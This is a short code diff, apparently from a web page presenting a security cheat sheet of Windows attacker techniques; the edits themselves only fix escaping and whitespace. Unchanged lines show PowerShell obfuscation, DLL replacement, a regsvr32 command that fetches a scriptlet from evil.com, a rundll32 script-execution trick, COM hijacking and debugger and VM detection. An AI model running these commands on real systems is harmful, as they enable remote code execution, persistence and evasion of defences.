@@ -64,14 +64,14 @@ $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('Write-Ho
 powershell -EncodedCommand $encoded
 
 # Character Substitution
-${W`rite-H`ost} "Hello"
+\${"Write-Host".Replace("i","!")} "Hello"
 
 # Variable Obfuscation
-${`} = "Write-Host"
-& ${`} "Hello"
+\${""}  = "Write-Host"
+& \${""} "Hello"
 
 # Tick Marks
-W`rite-H`ost "Hello"`}
+W\`rite-H\`ost "Hello"`}
                 </pre>
               </div>
 
@@ -134,7 +134,7 @@ copy malicious.dll "C:\\Program Files\\App\\legitimate.dll"
 regsvr32.exe /s /n /u /i:http://evil.com/file.sct scrobj.dll
 rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").run("calc");
 
-# COM Hijacking
+# COM Hijacking  
 reg add "HKCU\\Software\\Classes\\CLSID\\{GUID}\\InprocServer32" /ve /d "C:\\path\\to\\malicious.dll"`}
                 </pre>
               </div>
@@ -258,7 +258,7 @@ if (IsDebuggerPresent()) { ExitProcess(0); }
 # VM Detection
 $vm_artifacts = @(
     "VMware Tools",
-    "VirtualBox Guest Additions",
+    "VirtualBox Guest Additions", 
     "Parallels Tools",
     "Xen Tools"
 )
